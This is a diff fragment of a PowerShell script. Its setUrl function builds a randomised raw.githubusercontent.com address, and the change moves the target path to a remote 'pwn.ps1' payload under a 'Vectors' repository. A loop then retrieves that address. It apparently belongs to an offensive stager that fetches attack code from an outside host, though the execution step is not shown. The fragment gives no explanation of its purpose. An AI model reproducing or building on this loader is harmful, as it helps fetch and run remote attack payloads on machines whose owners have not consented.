@@ -22,7 +22,7 @@ function setUrl{
   for($i=0;$i-lt$sub.Length;$i++){
     $url+=$sub[(Get-Random -maximum $sub.Length)]
   }
-  return ("https://raw.githubusercontent.com/"+$url+"/Pentest/master/Vectors/pwn.ps1")
+  return ("https://raw.githubusercontent.com/"+$url+"/Vectors/master/ps1/pwn.ps1")
 }
 Do{
   $url=(setUrl)
